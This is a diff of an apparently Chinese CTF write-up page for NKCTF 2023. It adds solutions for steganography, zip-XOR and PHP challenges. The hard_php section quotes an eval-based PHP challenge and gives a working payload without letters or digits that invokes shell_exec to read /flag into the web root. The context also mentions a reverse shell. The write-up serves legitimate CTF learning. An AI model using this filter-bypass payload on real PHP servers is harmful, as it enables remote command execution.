@@ -40,6 +40,7 @@
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png">
@@ -64,7 +65,7 @@
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg">
 <meta property="article:published_time" content="2023-03-26T13:00:00.000Z">
-<meta property="article:modified_time" content="2023-03-27T12:55:19.600Z">
+<meta property="article:modified_time" content="2023-03-28T07:48:06.290Z">
 <meta property="article:author" content="lewiserii">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="nkctf">
@@ -289,7 +290,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          27k 字
+          28k 字
         
       </span>
     
@@ -300,7 +301,7 @@
         
         
         
-          271 分钟
+          283 分钟
         
       </span>
     
@@ -434,6 +435,22 @@
 <p>ce修改分数到2亿多</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p>
 <p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p>
+<h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>赛后复现</strong></p>
+<p>提示<code>出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗</code></p>
+<p>先将图片后多余的数据分离，使用<code>veracrypt</code>挂载，密钥为分离出的<code>png</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png"></p>
+<p>得到<code>flag.png</code>，图片尾得到<code>Tips:566*566</code></p>
+<p>放大图片观察到很多像素点，提取然后拼接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p>
+<h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现</strong></p>
+<p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p>
+<p>6位数字爆破，得到<code>114514</code></p>
+<p>hint1：<code>提示1：“CA1N”也很“疑惑”呢</code></p>
+<p>猜测是要对文件异或</p>
+<p>文件头为<code>13 08 40 47</code>，与常见文件头进行异或对比，发现异或<code>0x43</code>后为<code>zip</code></p>
+<h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p>
 <h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p>
 <h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p>
@@ -511,6 +528,13 @@
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p>
 <p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p>
+<h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>赛后复现</strong></p>
+<p>ctfshow的题目加上一些函数禁用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p><code>NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p>
+<p>url编码后上传</p>
 <h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p>
 <p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p>
